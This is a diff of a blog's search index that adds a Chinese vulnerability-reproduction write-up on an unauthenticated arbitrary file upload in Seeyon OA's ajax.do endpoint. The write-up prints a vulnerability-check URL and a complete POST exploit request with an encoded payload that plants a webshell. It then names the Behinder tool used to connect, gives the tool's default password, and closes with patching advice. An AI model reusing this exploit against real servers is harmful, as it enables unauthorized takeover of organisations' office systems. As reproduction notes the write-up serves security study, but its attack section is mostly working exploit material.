-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>①联系致远OA官方以获取最新相关补丁，升级至最新版本。<br>②限制访问seeyon/thirdpartyController.do.css/..;/ajax.do</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.1</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>dedecms网站搭建</title>
     <url>/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<ol>
@@ -771,6 +894,50 @@ set LHOST 192.168.141.133<span aria-hidden="true" class="line-numbers-rows"><spa
       </categories>
       <tags>
         <tag>2017.3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>致远OA-ajax.do任意文件上传漏洞复现</title>
+    <url>/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x<br>致远OA G6</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问thirdpartyController.do.css/..;/ajax.do，判断是否存在漏洞</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;seeyon&#x2F;thirdpartyController.do.css&#x2F;..;&#x2F;ajax.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>出现异常：java.lang.NullPointerException:null<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="图片"><br>使用工具生成payload，我使用的PoC如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;seeyon&#x2F;autoinstall.do.css&#x2F;..;&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip HTTP&#x2F;1.1
+Host: 127.0.0.1
+Connection: close
+Cache-Control: max-age&#x3D;0
+Upgrade-Insecure-Requests: 1
+User-Agent: Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto&#x2F;2.9.168 Version&#x2F;11.52
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Cookie: JSESSIONID&#x3D;7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL&#x3D;; login_locale&#x3D;zh_CN;
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 8819
+
+managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用burpsuite上传EXP，漏洞利用成功<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png" alt="图片"><br>利用失败会返回如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;
+&quot;message&quot;:&quot;被迫下线，原因：与服务器失去连接&quot;,
+&quot;code&quot;:&quot;-1&quot;,
+&quot;details&quot;:null
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>请求webshell,证明上传成功<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png" alt="图片"><br>使用冰蝎3进行连接，连接成功<br>Webshell地址:<a href="http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx">http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx</a><br>冰蝎3 默认马pass：rebeyond<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png" alt="图片"><br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png" alt="图片"></p>
+<p>冰蝎下载链接：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>①联系致远OA官方以获取最新相关补丁，升级至最新版本。<br>②限制访问seeyon/thirdpartyController.do.css/..;/ajax.do</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.1</tag>
       </tags>
   </entry>
 </search>
